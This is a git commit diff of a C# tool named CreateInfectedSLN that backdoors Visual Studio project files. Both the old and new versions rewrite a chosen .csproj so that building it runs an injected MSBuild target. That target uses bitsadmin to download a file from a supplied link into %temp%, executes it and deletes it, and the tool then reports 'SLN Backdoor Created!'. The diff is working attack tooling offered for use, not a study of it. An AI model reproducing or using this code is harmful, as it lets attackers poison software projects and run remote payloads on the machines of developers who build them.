00c8b79a089875cce8ce22b7656f80be077d6cb0
Joshua <73680704+UrFingPoor@users.noreply.github.com>
2022-11-10 21:32:20 -0500

    Update CreateInfectedSLN.cs

--- CreateInfectedSLN.cs
+++ CreateInfectedSLN.cs
@@ -1,40 +1,44 @@
-//this code is trash and should be improved alot have fun. 
 
-  private void CreateInfectedSLN(string Path, string Job, string rURL, string fName)
+       //this is now patched!
+       public void CreateInfectedSLN(string Job, string Link, string Filename)
         {
-            string vec0 = "<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">"; 
-            string pCall = "<Project ToolsVersion=\"14.0\" InitialTargets=\"Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">";
-            string vec1 = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />";
-            string payload = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\"/>^<Target Name=\"Build\">-<Exec Command=\"bitsadmin.exe /transfer " + Job + " " + rURL + " %temp%\\" + fName + "\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"%temp%\\" + fName + "\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"del %temp%\\" + fName + "\" >+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Message Importance=\"high\" Text=\"$(ErrorCode)\"/>-</Target> ";
-            string STR = File.ReadAllText(Path);
-    
-            if (File.Exists(Path + ".bk"))
+            using (var ofd = new OpenFileDialog()) 
             {
-                File.Delete(Path);
-                File.Copy(Path + ".bk", Path);
-                File.Delete(Path + ".bk");
-                File.Copy(Path, Path + ".bk");
+               if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    ofd.InitialDirectory = @"C:\";
+                    ofd.Title = "Find && Select A Visual Studios Project File";
+                    ofd.Filter = "Project File(*.csproj) | *.csproj | All files(*.*) | *.* ";
+                    ofd.RestoreDirectory = true;
 
-                payload = payload.Replace("^", "\n  ");
-                payload = payload.Replace("-", "\n    ");
-                payload = payload.Replace("+", "\n      ");
-                STR = STR.Replace(vec0, pCall);
-                STR = STR.Replace(vec1, payload);
-                File.WriteAllText(Path, STR);
-               
-                STR = "";
-            }
-            else
-            {
-                File.Copy(Path, Path + ".bk");
-                payload = payload.Replace("^", "\n  ");
-                payload = payload.Replace("-", "\n    ");
-                payload = payload.Replace("+", "\n      ");
-                STR = STR.Replace(vec0, pCall);
-                STR = STR.Replace(vec1, payload);
-                File.WriteAllText(Path, STR);
-               
-                STR = "";
+                    var projectfile = File.ReadAllText(ofd.FileName);
+                    string ToolsVersion15 = "<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">";
+                    string ToolsVersion14 = "<Project ToolsVersion=\"14.0\" InitialTargets=\"Clean;Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">";
+                    string Project = "<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />";
+                    string payload = $"<Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\"/>^<Target Name=\"Build\">-<Exec Command=\"bitsadmin.exe /transfer {Job} {Link} %temp%\\{Filename}\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"%temp%\\{Filename}\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Exec Command=\"del %temp%\\{Filename}\">+<Output TaskParameter=\"ExitCode\" PropertyName=\"ErrorCode\"/>-</Exec>-<Message Importance=\"high\" Text=\"$(ErrorCode)\"/>-</Target> ";
+
+                    switch (File.Exists($"{ofd.FileName}.bk"))
+                    {
+                        case true:
+                            //remove old backup and create a new one
+                            File.Delete(ofd.FileName); File.Copy($"{ofd.FileName}.bk", ofd.FileName);
+                            File.Delete($"{ofd.FileName}.bk"); File.Copy(ofd.FileName, $"{ofd.FileName}.bk");
+                            payload = payload.Replace("^", "\n  ").Replace("-", "\n    ").Replace("+", "\n      ");
+                            projectfile = projectfile.Replace(ToolsVersion15, ToolsVersion14);
+                            projectfile = projectfile.Replace(Project, payload);
+                            File.WriteAllText(ofd.FileName, projectfile);
+                            MessageBox.Show($"SLN Backdoor Created!\nRemoved Old up & created a new one.!", "The Bro's", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            break;
+                        case false:
+                            //create backup and backdoor
+                            File.Copy(ofd.FileName, $"{ofd.FileName}.bk");
+                            payload = payload.Replace("^", "\n  ").Replace("-", "\n    ").Replace("+", "\n      ");
+                            projectfile = projectfile.Replace(ToolsVersion15, ToolsVersion14);
+                            projectfile = projectfile.Replace(Project, payload);
+                            File.WriteAllText(ofd.FileName, projectfile);
+                            MessageBox.Show($"SLN Backdoor Created & Backup made!", "The Bro's", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            break;
+                    }
+                }
             }
         }
-   
